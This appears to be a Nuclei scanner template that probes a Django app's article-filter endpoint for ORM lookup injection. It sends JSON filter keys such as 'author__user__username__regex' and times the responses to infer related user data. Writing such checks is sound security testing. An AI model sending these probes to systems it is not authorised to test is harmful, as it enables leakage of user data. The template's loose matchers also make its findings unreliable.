id: django-orm-leak-enhanced

info:
  name: Django ORM Information Leak (Enhanced)
  author: s1d6p01nt7
  severity: high
  description: |
    This template checks for information leaks in Django applications due to improper handling of ORM queries. It includes checks for various data types and leakage methods.

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/login/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Django administration"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/articles/filter/"
    headers:
      Content-Type: application/json
    body: |
      {
        "id__gt": 10
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "10"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/articles/filter/"
    headers:
      Content-Type: application/json
    body: |
      {
        "title__startswith": "This is a test"
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "This is a test"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/articles/filter/"
    headers:
      Content-Type: application/json
    body: |
      {
        "author__user__username__regex": "^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: dsl
        dsl:
          - "response_time > 10"
